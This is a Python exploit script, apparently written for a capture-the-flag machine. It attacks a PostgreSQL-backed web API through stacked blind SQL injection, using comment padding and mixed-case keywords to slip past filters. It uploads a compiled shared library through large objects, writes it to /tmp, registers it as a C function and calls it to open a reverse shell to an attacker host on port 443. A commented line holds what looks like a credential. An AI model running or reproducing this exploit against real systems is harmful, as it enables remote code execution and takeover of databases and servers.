#!/usr/bin/python3


# from pwn import *
from pprint import pprint
import requests
import string
import math
import random

LHOST = "10.10.15.101"
LPORT = 443


def blind_sqli(query: str) -> None:
    password = ""
    target_url = "10.129.90.139"
    # log.progress("Big content creation for a reverse shell in POSGRESQL ")
    # for x in range(1, 62):
    #     p.status(password)
    #     for number in range(32, 127):
    payload = f"admin'//**//**/**/And//**//**/**/1=1//**//**/**/dElimiTER E'\x07'//**//**/**/{query}-/**/-"
    url = f"http://{target_url}:8080/api/v1/check-user?u={payload}"
    ress = requests.get(url=url)
    print(ress.status_code)


with open("pg_rev_shell.so","rb") as f:
    raw = f.read()

# Create a large object
loid = random.randint(50000,60000)
blind_sqli(f"SelECT lo_create({loid})//**//**/**/dElimiTER E'\x07'")
print(f"[*] Created large object with ID: {loid}")

# Upload pg_rev_shell.so to large object
for pageno in range(math.ceil(len(raw)/2048)):
    page = raw[pageno*2048:pageno*2048+2048]
    print(f"[*] Uploading Page: {pageno}, Length: {len(page)}")
    blind_sqli(f"InsERT//**//**/**/InTO//**//**/**/pg_largeobject//**//**/**/(loid, pageno, data)//**//**/**/ValUES//**//**/**/({loid}, {pageno},decode('{page.hex()}','hex'))//**//**/**/dElimiTER E'\x07'")

# Write large object to file and run reverse shell
query  = f"SelECT//**//**/**/lo_export({loid}, '/tmp/pg_rev_shell.so')//**//**/**/dElimiTER E'\x07'"
query += f"SelECT//**//**/**/lo_unlink({loid})//**//**/**/dElimiTER E'\x07'"
query += "DRoP//**//**/**/FUncTION//**//**/**/If//**//**/**/ExiSTS//**//**/**/rev_shell//**//**/**/dElimiTER E'\x07'"
query += "CreATE//**//**/**/FunCTION//**//**/**/rev_shell(teXt, inTeger)//**//**/**/REtuRNS//**//**/**/inteGEr//**//**/**/aS//**//**/**/'/tmp/pg_rev_shell.so',//**//**/**/'rev_shell'//**//**/**/LAngUAGE//**//**/**/C//**//**/**/STriCT//**//**/**/dElimiTER E'\x07'"
query += f"SelECT//**//**/**/rev_shell('{LHOST}',{LPORT})//**//**/**/dElimiTER E'\x07'"
print(f"[*] Writing pg_rev_shell.so to disk and triggering reverse shell (LHOST: {LHOST}, LPORT: {LPORT})")
blind_sqli(query)




# # admin $%a$%bNYVpfJnL

# def main():
#     try:
#         blind_sqli()
#     except Exception as e:
#         print(str(e))
#         exit(1)
        
#     except KeyboardInterrupt:
#         exit(0)



# if __name__ == "__main__":
#     main()
